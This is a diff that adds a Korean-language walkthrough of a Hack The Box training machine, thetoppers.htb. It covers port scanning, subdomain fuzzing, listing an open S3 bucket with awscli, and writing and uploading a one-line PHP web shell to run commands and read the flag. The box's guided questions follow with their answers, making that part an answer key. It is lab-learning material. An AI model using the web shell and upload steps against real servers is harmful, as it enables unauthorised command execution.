@@ -1,0 +1,88 @@
+1. 포트 확인
+nmap -sV htb_ip
+
+
+2. 웹 접속
+http://htb_ip
+
+
+3. 도메인 등록 및 서브 도메인 찾기
+서버 등록 sudo nano /etc/hosts 접속 후 htb_ip		도메인
+서브 도메인 찾기
+wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.thetoppers.htb" --sc 404 http://thetoppers.htb
+서브 도메인 등록 sudo nano /etc/hosts 접속 후 htb_ip		도메인 서브도메인
+다른 명령어인 ffuf는 보이지않았음
+
+
+4. aws 등록
+aws configure 후 아무거나 입력
+제대로 쓸게 아니니 전부 temp로 입력
+버킷 확인
+aws --endpoint-url http://s3.thetoppers.htb s3 ls
+aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
+
+
+5. 웹쉘 업로드
+웹쉘 생성 echo '<?php system($_GET["cmd"]); ?>' > shell.php 후 
+aws --endpoint-url http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/
+웹쉘 업로드
+웹에서 웹쉘이 업로드 된 위치로 이동 http://thetoppers.htb/shell.php
+명령어 삽입으로 flag 확인
+;로 명령어 여러개 입력
+
+
+-------------------------------
+
+
+1. How many TCP ports are open?
+열려 있는 TCP 포트는 몇 개입니까?
+
+> 2
+
+
+2. What is the domain of the email address provided in the "Contact" section of the website?
+웹사이트의 "연락처" 섹션에 제공된 이메일 주소의 도메인은 무엇입니까?
+
+> thetoppers.htb
+
+
+3. In the absence of a DNS server, which Linux file can we use to resolve hostnames to IP addresses in order to be able to access the websites that point to those hostnames?
+DNS 서버가 없는 경우, 호스트 이름을 IP 주소로 변환하여 해당 호스트 이름을 가리키는 웹사이트에 접속할 수 있도록 하는 Linux 파일은 무엇일까요?
+
+> /etc/hosts
+
+
+4. Which sub-domain is discovered during further enumeration?
+추가 열거 과정에서 어떤 하위 도메인이 발견되었습니까?
+
+> s3.thetoppers.htb
+
+
+5. Which service is running on the discovered sub-domain?
+발견된 서브도메인에서 실행 중인 서비스는 무엇입니까?
+
+> Amazon S3
+
+
+6. Which command line utility can be used to interact with the service running on the discovered sub-domain?
+발견된 하위 도메인에서 실행 중인 서비스와 상호 작용하는 데 사용할 수 있는 명령줄 유틸리티는 무엇입니까?
+
+> awscli
+
+
+7. Which command is used to set up the AWS CLI installation?
+AWS CLI 설치를 설정하는 데 사용되는 명령어는 무엇입니까?
+
+> aws configure
+
+
+8. What is the command used by the above utility to list all of the S3 buckets?
+위 유틸리티에서 모든 S3 버킷 목록을 표시하는 데 사용되는 명령어는 무엇입니까?
+
+> aws s3 ls
+
+
+9. This server is configured to run files written in what web scripting language?
+이 서버는 어떤 웹 스크립팅 언어로 작성된 파일을 실행하도록 구성되어 있습니까?
+
+> php
